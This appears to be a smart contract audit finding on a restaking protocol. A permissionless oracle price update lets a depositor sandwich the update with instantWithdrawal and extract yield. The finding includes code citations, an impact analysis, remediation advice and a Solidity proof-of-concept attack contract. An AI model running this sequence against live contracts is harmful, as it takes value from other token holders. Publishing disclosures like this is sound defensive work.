### Title
Oracle Price Update Sandwiching Enables Yield Extraction via Deposit + `instantWithdrawal` - (File: contracts/LRTWithdrawalManager.sol, contracts/LRTOracle.sol, contracts/LRTDepositPool.sol)

### Summary
`LRTOracle.updateRSETHPrice()` is a permissionless public function that updates the stored `rsETHPrice` state variable. Because deposits use the stale stored price and `instantWithdrawal` uses the live stored price at execution time, an attacker can sandwich a price update — depositing at the old (lower) rsETH price, triggering the update themselves, then immediately withdrawing at the new (higher) price — extracting yield from the protocol in a single atomic sequence.

### Finding Description

`LRTOracle.rsETHPrice` is a stored state variable updated only when `updateRSETHPrice()` is explicitly called. This function is `public` and `whenNotPaused`, callable by any address: [1](#0-0) 

The deposit path in `LRTDepositPool.getRsETHAmountToMint` computes rsETH to mint using the **stored** (potentially stale) `rsETHPrice`:

```
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice()
``` [2](#0-1) 

The instant withdrawal path in `LRTWithdrawalManager.getExpectedAssetAmount` computes assets to return using the **current** `rsETHPrice` at withdrawal time:

```
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset)
``` [3](#0-2) 

`instantWithdrawal` is a publicly callable function (gated only by `isInstantWithdrawalEnabled[asset]`) that burns rsETH and immediately transfers the underlying asset to the caller: [4](#0-3) 

The two formulas are mathematical inverses. If `rsETHPrice` is the same at deposit and withdrawal, the user receives exactly what they deposited (minus fees). But if `rsETHPrice` increases between deposit and withdrawal, the user receives more than they deposited:

- Deposit `X` stETH at stale `P_old` → receive `X * assetPrice / P_old` rsETH
- Call `updateRSETHPrice()` → `rsETHPrice` becomes `P_new > P_old`
- Instant withdraw → receive `(X * assetPrice / P_old) * P_new / assetPrice = X * (P_new / P_old)` stETH
- **Profit = `X * (P_new/P_old − 1)` stETH**

The `instantWithdrawalFee` (max 10%, default 0) is the only mitigation, but it is not calibrated to the oracle update magnitude and may be zero: [5](#0-4) 

The `pricePercentageLimit` guard in `_updateRsETHPrice` only blocks non-manager callers when the price increase exceeds the configured threshold; it does not prevent exploitation of sub-threshold updates: [6](#0-5) 

### Impact Explanation

The attacker's profit (`X * (P_new/P_old − 1)`) is extracted directly from the protocol's TVL, diluting the value backing all other rsETH holders. This constitutes **theft of unclaimed yield** — the yield that accrued to the protocol between the last price update and the current block is captured by the attacker rather than distributed proportionally to all holders. Impact is **High**.

### Likelihood Explanation

The attack requires two conditions:
1. `isInstantWithdrawalEnabled[asset]` is `true` — a manager-controlled toggle that is explicitly designed to be enabled for normal operation.
2. `rsETHPrice` is stale relative to the current underlying asset values — this is the normal state between oracle update calls, which are not atomic with every block.

The attacker does not need to front-run any external transaction. They can execute the entire sequence (deposit → `updateRSETHPrice()` → `instantWithdrawal`) atomically in a single transaction via a contract, with no mempool monitoring required. Likelihood is **Medium** (conditional on instant withdrawal being enabled, which is an intended operational feature).

### Recommendation

1. **Short term:** Enforce a minimum `instantWithdrawalFee` that exceeds the maximum possible rsETHPrice appreciation between oracle updates (analogous to the CAP report's baseline fee recommendation). Alternatively, snapshot the `rsETHPrice` at deposit time and use the **minimum** of the deposit-time price and the current price when computing instant withdrawal amounts.

2. **Long term:** Require a minimum holding period (e.g., one block or a configurable delay) between a deposit and an `instantWithdrawal` for the same address, preventing atomic sandwich execution. Consider also making `updateRSETHPrice()` callable only by privileged roles, or adding a per-block price-update cooldown.

### Proof of Concept

```solidity
contract OracleSandwichAttack {
    ILRTDepositPool depositPool;
    ILRTOracle oracle;
    ILRTWithdrawalManager withdrawalManager;
    IERC20 stETH;
    IERC20 rsETH;

    function attack(uint256 amount) external {
        // Step 1: rsETHPrice is stale (P_old < P_new)
        // Deposit stETH — mints more rsETH than fair value
        stETH.approve(address(depositPool), amount);
        depositPool.depositAsset(address(stETH), amount, 0, "");

        // Step 2: Trigger the price update — rsETHPrice increases to P_new
        oracle.updateRSETHPrice();

        // Step 3: Instantly withdraw at the new higher rsETHPrice
        uint256 rsETHBalance = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalManager), rsETHBalance);
        withdrawalManager.instantWithdrawal(address(stETH), rsETHBalance, "");

        // Result: stETH balance > initial amount by X * (P_new/P_old - 1)
    }
}
```

The attacker calls `attack()` in a single transaction. No flash loan is required if the attacker already holds the deposit asset. The profit scales linearly with deposit size and with the magnitude of the rsETHPrice update. [1](#0-0) [7](#0-6) [8](#0-7) [4](#0-3)

### Citations

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L256-266)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTDepositPool.sol (L506-521)
```text
    function getRsETHAmountToMint(
        address asset,
        uint256 amount
    )
        public
        view
        override
        returns (uint256 rsethAmountToMint)
    {
        // setup oracle contract
        address lrtOracleAddress = lrtConfig.getContract(LRTConstants.LRT_ORACLE);
        ILRTOracle lrtOracle = ILRTOracle(lrtOracleAddress);

        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L212-253)
```text
    function instantWithdrawal(
        address asset,
        uint256 rsETHUnstaked,
        string calldata referralId
    )
        external
        nonReentrant
        whenNotPaused
        onlySupportedAsset(asset)
        onlySupportedStrategy(asset)
        onlyInstantWithdrawalAllowed(asset)
    {
        if (rsETHUnstaked == 0 || rsETHUnstaked < minRsEthAmountToWithdraw[asset]) {
            revert InvalidAmountToWithdraw();
        }
        if (IERC20(lrtConfig.rsETH()).balanceOf(msg.sender) < rsETHUnstaked) revert NotEnoughRsETH();
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
        IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
        ILRTUnstakingVault unstakingVault = ILRTUnstakingVault(lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT));
        if (assetAmountUnlocked > unstakingVault.getAssetsAvailableForInstantWithdrawal(asset)) {
            revert CantInstantWithdrawMoreThanAvailable();
        }

        unstakingVault.redeem(asset, assetAmountUnlocked);

        uint256 fee = (assetAmountUnlocked * instantWithdrawalFee) / 10_000;
        uint256 userAmount = assetAmountUnlocked - fee;

        address feeRecipient = instantWithdrawalFeeRecipient;
        if (feeRecipient == address(0)) {
            // Backwards-compatible default: send fees to the protocol treasury
            feeRecipient = lrtConfig.getContract(LRTConstants.PROTOCOL_TREASURY);
        }
        if (fee > 0) {
            _transferAsset(asset, feeRecipient, fee);
            emit InstantWithdrawalFeeCollected(msg.sender, asset, fee);
        }

        _transferAsset(asset, msg.sender, userAmount);
        emit ReferralIdEmitted(referralId);
        emit AssetWithdrawalFinalized(msg.sender, asset, rsETHUnstaked, userAmount);
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L580-594)
```text
    function getExpectedAssetAmount(
        address asset,
        uint256 amount
    )
        public
        view
        override
        returns (uint256 underlyingToReceive)
    {
        // setup oracle contract
        ILRTOracle lrtOracle = ILRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE));

        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
    }
```
